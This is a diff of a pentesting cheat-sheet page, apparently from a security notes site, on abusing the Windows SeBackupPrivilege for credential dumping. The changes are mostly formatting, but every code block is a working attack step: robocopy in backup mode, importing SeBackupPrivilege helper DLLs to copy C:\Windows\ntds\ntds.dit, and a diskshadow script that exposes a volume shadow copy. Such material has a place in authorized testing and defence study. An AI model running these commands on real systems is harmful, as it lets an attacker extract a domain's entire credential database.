@@ -7,13 +7,14 @@ tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivi
 ### Abuse #1: Robocopy
 
 ```console
-# For example
 robocopy /b <TARGET_DIR_PATH> <DEST_DIR> <TARGET_FILE>
 ```
 
 ---
 
-### Abuse #2: Helper dlls
+### Abuse #2: Use Helper DLLs
+
+#### 1. Import Helper Modules
 
 ```console
 import-module .\SeBackupPrivilegeCmdLets.dll
@@ -23,12 +24,13 @@ import-module .\SeBackupPrivilegeCmdLets.dll
 import-module .\SeBackupPrivilegeUtils.dll
 ```
 
+#### 2. Copy Target File
+
 ```console
 Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>'
 ```
 
-```console
-# For example
+```console {class="sample-code"}
 Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
 ```
 
@@ -51,17 +53,15 @@ create
 expose %test% x:
 ```
 
-<br>
+#### 2. Convert to DOS Format
 
 ```console
-# Convert to dos format
 unix2dos vss.dsh
 ```
 
 #### 2. Run vss.dsh
 
 ```console
-# Upload and run
 diskshadow /s C:\ProgramData\vss.dsh
 ```
 
